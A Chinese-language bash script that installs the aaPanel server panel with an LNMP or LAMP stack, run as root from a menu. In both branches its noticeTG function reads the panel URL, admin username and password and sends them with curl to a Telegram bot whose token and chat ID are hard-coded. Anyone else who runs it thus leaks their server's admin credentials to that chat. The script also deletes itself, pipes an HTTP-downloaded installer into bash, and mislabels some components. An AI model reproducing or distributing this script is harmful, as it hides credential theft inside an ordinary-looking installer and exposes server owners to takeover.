#!/usr/bin/env bash
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin
export PATH


# 设置字体颜色函数
function blue(){
    echo -e "\033[34m\033[01m $1 \033[0m"
}
function green(){
    echo -e "\033[32m\033[01m $1 \033[0m"
}
function greenbg(){
    echo -e "\033[43;42m\033[01m $1 \033[0m"
}
function red(){
    echo -e "\033[31m\033[01m $1 \033[0m"
}
function redbg(){
    echo -e "\033[37;41m\033[01m $1 \033[0m"
}
function yellow(){
    echo -e "\033[33m\033[01m $1 \033[0m"
}
function white(){
    echo -e "\033[37m\033[01m $1 \033[0m"
}

#工具安装
install_pack() {
    pack_name="基础工具"
    echo "===> Start to install curl"    
    if [ -x "$(command -v yum)" ]; then
        command -v curl > /dev/null || yum install -y curl
    elif [ -x "$(command -v apt)" ]; then
        command -v curl > /dev/null || apt install -y curl
    else
        echo "Package manager is not support this OS. Only support to use yum/apt."
        exit -1
    fi    
}




install_lamp(){
    #check root
[ $(id -u) != "0" ] && { echo "错误: 您必须以root用户运行此脚本"; exit 1; }
rm -rf all
rm -rf $0
init(){
    echo red "懒人部署宝塔环境：一般耗时大约十几分钟"
    echo "开始安装宝塔命令"
    a=$(date "+%s")
    yum install -y wget &>/dev/null
    #脚本来源于宝塔官网
    wget -O install.sh http://www.aapanel.com/script/install_6.0_en.sh &>/dev/null
    echo y | bash install.sh &>/dev/null
    b=$(date "+%s")    
    echo "宝塔面板已完成安装 耗时：$(($b-$a))s"
}

init_env(){
    echo "开始安装Apache 2.4.46"
    bash /www/server/panel/install/install_soft.sh 1 install apache 2.4.46 &>/dev/null
    c=$(date "+%s")
    echo "Apache安装完成，耗时：$(($c-$b))s"
    echo "开始安装php7.3"
    bash /www/server/panel/install/install_soft.sh 1 install php 7.3 &>/dev/null || echo 'Ignore Error' &>/dev/null
    d=$(date "+%s")
    echo "php安装完成，耗时：$(($d-$c))s"
    echo "开始安装mysql mariadb_10.3"
    bash /www/server/panel/install/install_soft.sh 1 install mysql 5.6 &>/dev/null
    e=$(date "+%s")
    echo "mysql安装完成，耗时：$(($e-$d))s"    
    echo "开始安装phpadmin4.9"
    bash /www/server/panel/install/install_soft.sh 1 install phpmyadmin 4.9 &>/dev/null || echo 'Ignore Error' &>/dev/null
    f=$(date "+%s")
    echo "phpadmin安装完成，耗时：$(($f-$e))s"
    echo "所有软件已安装完毕"
    #添加软件到首页    
    echo '["linuxsys", "webssh", "apache", "php-7.3", "mysql", "phpmyadmin"]' > /www/server/panel/config/index.json
    echo "正在重启所有服务器组件"
    for file in `ls /etc/init.d`
    do if [ -x /etc/init.d/${file} ];  then 
        /etc/init.d/$file restart
    fi done
    g=$(date "+%s")        
    echo "重启各种服务组件完毕，耗时：$(($g-$f))s"
}
noticeTG(){
    TOKEN=1507893381:AAEFx0U1gXdduT2mmqZ_VDImDuDsnczhB2o     #TG机器人API—Token口令
    chat_ID=427481352      #推送消息的ID（可以是个人、也可以是Group或Chanel）
    BtPanelURL=`echo 14 | bt |grep Internet`
    username=`echo 14 | bt |grep username:`
    password=`echo 14 | bt |grep password:`
    message_text="Boss，您的服务器搭建完毕了....
    $BtPanelURL
    $username
    $password"
    #echo "$message_text"
    curl -s -X POST https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${chat_ID} -d text="${message_text}" > /dev/null    
}

init
init_env
totaltime=$(($g-$a))
hour=$(( $totaltime/3600 ))
min=$(( ($totaltime-${hour}*3600)/60 ))
sec=$(( $totaltime-${hour}*3600-${min}*60 ))
echo ${hour}:${min}:${sec}
noticeTG 
echo "=============安装概览================="
echo "BT面板：$(($b-$a))s"
echo "apache:$(($c-$b))s"
echo "php:$(($d-$c))s"
echo "mysql:$(($e-$d))s"
echo "phpadmin:$(($f-$e))s"
echo "Total总耗时:${hour}时:${min}分:${sec}秒"
echo "====================================="
#显示宝塔面板信息
bt 14
  
}

install_lnmp(){
    #check root
[ $(id -u) != "0" ] && { echo "错误: 您必须以root用户运行此脚本"; exit 1; }
rm -rf all
rm -rf $0
init(){
    echo "懒人部署宝塔环境：一般耗时大约十几分钟"
    echo "开始安装宝塔命令"
    a=$(date "+%s")
    yum install -y wget &>/dev/null
    #脚本来源于宝塔官网
    wget -O install.sh http://www.aapanel.com/script/install_6.0_en.sh &>/dev/null
    echo y | bash install.sh &>/dev/null
    b=$(date "+%s")    
    echo "宝塔面板已完成安装 耗时：$(($b-$a))s"
}

init_env(){
    echo "开始安装NGINX1.17"
    bash /www/server/panel/install/install_soft.sh 1 install nginx 1.17 &>/dev/null
    c=$(date "+%s")
    echo "Apache安装完成，耗时：$(($c-$b))s"
    echo "开始安装php7.3"
    bash /www/server/panel/install/install_soft.sh 1 install php 7.3 &>/dev/null || echo 'Ignore Error' &>/dev/null
    d=$(date "+%s")
    echo "php安装完成，耗时：$(($d-$c))s"
    echo "开始安装mysql mariadb_10.3"
    bash /www/server/panel/install/install_soft.sh 1 install mysql 5.6 &>/dev/null
    e=$(date "+%s")
    echo "mysql安装完成，耗时：$(($e-$d))s"    
    echo "开始安装phpadmin4.9"
    bash /www/server/panel/install/install_soft.sh 1 install phpmyadmin 4.9 &>/dev/null || echo 'Ignore Error' &>/dev/null
    f=$(date "+%s")
    echo "phpadmin安装完成，耗时：$(($f-$e))s"
    echo "所有软件已安装完毕"
    #添加软件到首页    
    echo '["linuxsys", "webssh", "apache", "php-7.3", "mysql", "phpmyadmin"]' > /www/server/panel/config/index.json
    echo "正在重启所有服务器组件"
    for file in `ls /etc/init.d`
    do if [ -x /etc/init.d/${file} ];  then 
        /etc/init.d/$file restart
    fi done
    g=$(date "+%s")        
    echo "重启各种服务组件完毕，耗时：$(($g-$f))s"
}
noticeTG(){
    TOKEN=1507893381:AAEFx0U1gXdduT2mmqZ_VDImDuDsnczhB2o     #TG机器人API—Token口令
    chat_ID=427481352      #推送消息的ID（可以是个人、也可以是Group或Chanel）
    BtPanelURL=`echo 14 | bt |grep Internet`
    username=`echo 14 | bt |grep username:`
    password=`echo 14 | bt |grep password:`
    message_text="Boss，您的服务器搭建完毕了....
    $BtPanelURL
    $username
    $password"
    #echo "$message_text"
    curl -s -X POST https://api.telegram.org/bot${TOKEN}/sendMessage -d chat_id=${chat_ID} -d text="${message_text}" > /dev/null    
}

init
init_env
totaltime=$(($g-$a))
hour=$(( $totaltime/3600 ))
min=$(( ($totaltime-${hour}*3600)/60 ))
sec=$(( $totaltime-${hour}*3600-${min}*60 ))
echo ${hour}:${min}:${sec}
noticeTG 
echo "=============安装概览================="
echo "BT面板：$(($b-$a))s"
echo "apache:$(($c-$b))s"
echo "php:$(($d-$c))s"
echo "mysql:$(($e-$d))s"
echo "phpadmin:$(($f-$e))s"
echo "Total总耗时:${hour}时:${min}分:${sec}秒"
echo "====================================="
#显示宝塔面板信息
bt 14

}

#开始菜单
start_menu(){
    clear
    echo
    white "—————————————基础环境安装——————————————"
    red "1.安装LNMP-Nginx-php-mysql "
    blue "2.安装LAMP-Apache-php-mysql "
    white ""
    echo
    echo
    read -p "请输入数字:" num
    case "$num" in
    1)
    install_lnmp
	;;
    2)
    install_lamp
    ;;                                    
	0)
	exit 1
	;;
	*)
	clear
	echo "请输入正确数字"
	sleep 1s
	start_menu
	;;
    esac
}

start_menu
